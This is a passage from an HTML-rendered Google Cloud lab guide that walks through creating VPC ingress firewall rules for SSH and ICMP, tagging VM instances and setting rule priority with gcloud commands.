cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh qwiklabs@mynet-vm-2 --zone Zone 2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>If prompted, type </span><code>Y</code><span> and press </span><strong><span>Enter</span></strong><span> twice to proceed.</span></p><p><span>We should </span><strong><span>NOT</span></strong><span> be able to connect via SSH to the instances. There is currently no inbound access allowed. Igonre the error message </span><strong><span>ERROR: (gcloud.compute.ssh) [/usr/bin/ssh] exited with return code [255]</span></strong></p><h4 id='task-4-create-custom-ingress-firewall-rules'><span>Task 4. Create custom ingress firewall rules</span></h4><p><span>In this task, you use Cloud Shell as your client host to test SSH connectivity to the instances. The external IP address of the Cloud Shell instance can be easily retrieved.</span></p><p><span>However, the IP address of your Cloud Shell instance can change if you close and reopen it, or if it is recycled due to inactivity. This should not be a problem during this lab. For a &quot;real&quot; project, you would allow the IP address of your SSH client host and there should not be a problem.</span></p><p><strong><span>Note:</span></strong><span> As you just verified, the browser-based console SSH feature used to connect to VM instances does not currently work. If you want to allow that, you need a firewall rule that allows the source IP address. However, source IP addresses for browser-based SSH sessions are dynamically allocated by the Cloud Console and can vary from session to session.</span></p><p>&nbsp;</p><p><span>For the feature to work, you must allow connections either from any IP address, or from Google&#39;s IP address range, which you can retrieve using public SPF records. Either of these options may pose unacceptable risks, depending on your requirements. Instead, you would allow the IP address of the SSH clients you are using to connect.</span></p><h5 id='allow-ssh-access-from-cloud-shell'><span>Allow SSH access from Cloud Shell</span></h5><ol start='' ><li><p><span>Switch back to or reopen Cloud Shell.</span></p></li><li><p><span>To retrieve the external IP address of the Cloud Shell instance, run the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ip=$(curl -s https://api.ipify.org)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "My External IP address is: $ip"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Sample output</span></strong><span> (your IP will be different):</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">My External IP address is: 35.229.72.135</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>To add a firewall rule that allows port 22 (SSH) traffic from the Cloud Shell IP address, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-allow-ssh-from-cs \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network mynetwork --action ALLOW --direction INGRESS \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules tcp:22 --source-ranges $ip --target-tags=lab-ssh</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><p><span>This firewall rule is also given a target tag of </span><em><span>lab-ssh</span></em><span>, which means it applies only to instances that are tagged with the lab-ssh tag.</span></p><ol start='' ><li><p><span>To view the firewall rule in the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>VPC network &gt; Firewall</span></strong><span>.</span></p></li></ol><p><span>It will look similar to the following, but your IP address will be different:</span></p><p><img src="https://cdn.qwiklabs.com/9uKhUJ%2FQAhtDY%2B5b5FXwBXuOImH%2F38MeUcSK7O6MzEk%3D" referrerpolicy="no-referrer" alt="Configuration for ingress lab-ssh firewall"></p><p><span>This firewall rule will be applied only to instances tagged with </span><em><span>lab-ssh</span></em><span>. It is currently not being applied to any instances.</span></p><p><strong><span>Note:</span></strong><span> You have just created and applied a firewall rule using a tag. One issue with tags is that they must be added to instances and could possibly be added or removed inadvertently. Firewall rules can also be applied to instances by the service account used. These rules will be applied automatically to all instances that use the specified service account.</span></p><ol start='' ><li><p><span>To add the lab-ssh network tag to the </span><strong><span>mynet-vm-2</span></strong><span> and </span><strong><span>mynet-vm-1</span></strong><span> instances, run the following commands in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances add-tags mynet-vm-2 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --zone Zone 2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --tags lab-ssh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances add-tags mynet-vm-1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --zone Zone 1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --tags lab-ssh</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p>&nbsp;</p><h5 id='stateful-firewalls'><span>Stateful firewalls</span></h5><p><span>In VPC networks, firewall rules are stateful. So for each initiated connection tracked by allow rules in one direction, the return traffic is automatically allowed, regardless of any rules.</span></p><ol start='' ><li><p><span>To ssh into the </span><strong><span>mynet-vm-2</span></strong><span> instance, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh qwiklabs@mynet-vm-2 --zone Zone 2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>It will take several seconds to negotiate the SSH keys, but the connection should succeed. This verifies that the firewall rule is allowing the traffic.</span></p><ol start='' ><li><p><span>Type </span><code>exit</code><span> to log off the </span><strong><span>mynet-vm-2</span></strong><span> instance.</span></p></li><li><p><span>To ssh into the </span><strong><span>mynet-vm-1</span></strong><span> instance, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute ssh qwiklabs@mynet-vm-1 --zone Zone 1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This connection should also succeed because the </span><strong><span>mynet-vm-1</span></strong><span> instance is in the same network, and the firewall rule you created is allowing access to all instances.</span></p><h5 id='allow-all-instances-on-the-same-network-to-communicate-via-ping'><span>Allow all instances on the same network to communicate via ping</span></h5><ol start='' ><li><p><span>While still logged in to the </span><strong><span>mynet-vm-1</span></strong><span> instance, try pinging the </span><strong><span>mynet-vm-2</span></strong><span>instance with the command shown below. (Replace the </span><em><span>[PROJECT_ID]</span></em><span> with the PROJECT_ID for your lab exercise.)</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The ping command will not succeed. Even though the </span><strong><span>mynet-vm-1</span></strong><span> and the </span><strong><span>mynet-vm-2</span></strong><span> instances are in the same VPC network, all traffic is blocked by default unless there is a firewall rule allowing it.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping if needed. Do not log out of the </span><strong><span>mynet-vm-1</span></strong><span> instance yet.</span></p></li><li><p><span>To open a new Cloud Shell window, click </span><strong><span>Open a new tab</span></strong><span> (</span><strong><span>+</span></strong><span>).</span></p></li><li><p><span>To add a firewall rule that allows ALL instances in the mynetwork VPC to ping each other, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-allow-icmp-internal --network \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork --action ALLOW --direction INGRESS --rules icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--source-ranges 10.128.0.0/9</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> This firewall rule does not use a target-tag and therefore applies to all instances in the network by default. There is no need to tag any instances for this firewall to take effect. This kind of firewall rule is useful if all instances in a network need the same rule, but should also be used with caution because they affect all instances.</span></p><ol start='' ><li><p><span>Switch back to the first Cloud Shell session that is connected to </span><strong><span>mynet-vm-1</span></strong><span> and run the ping again. This time it should work.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice that the hostname </span><em><span>mynet-vm-2</span></em><span> resolved to the internal IP address of the instance. The internal IP will start with </span><em><span>10.132.0</span></em><span> (for example, </span><em><span>10.132.0.2</span></em><span>). Google Cloud resolves internal hostnames for you.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li><li><p><span>You can also try pinging the internal IP address directly and that will also work. Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li><li><p><span>To locate the external IP address of </span><strong><span>mynet-vm-2</span></strong><span>, on the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>mynet-vm-2</span></strong><span>, locate and copy the external IP address of the instance.</span></p></li><li><p><span>From the Cloud Shell session that is connected to </span><strong><span>mynet-vm-1</span></strong><span>, try to ping the external IP address of the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This should </span><strong><span>NOT</span></strong><span> work. When you ping the external IP address, the connection goes through the internet gateway, which causes the request to be NATed. The request is now coming from the </span><em><span>external</span></em><span> IP address of the mynet-vm-1 instance. The firewall rule is to only allow ICMP requests that come from </span><em><span>internal</span></em><span> IP addresses.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create custom ingress firewall rules</span></p><p>&nbsp;</p><h4 id='task-5-set-the-firewall-rule-priority'><span>Task 5. Set the firewall rule priority</span></h4><p><span>In this task, you set the firewall rule priority to deny ICMP traffic. You then verify that any traffic that does not match the rule priority is denied.</span></p><p><span>So far, all the rules created have been ingress allow rules, so the priority has not been important. Firewall rules can be both allow and deny, can specify ingress and egress, and have a priority from 0 to 65,535. If you do not set a priority, the default is 1,000. Rules are evaluated based on priority, starting from the lowest value. The first rule that matches gets applied.</span></p><ol start='' ><li><p><span>In the first Cloud Shell session, verify that you are still connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance. You can tell because the prompt will be: </span><code>qwiklabs@mynet-vm-1:~$</code><span>.</span></p></li></ol><p><span>If not connected, use the following command to reconnect:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute ssh qwiklabs@mynet-vm-1 --zone Zone 1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Verify that you can still ping the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.Zone 2.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Press 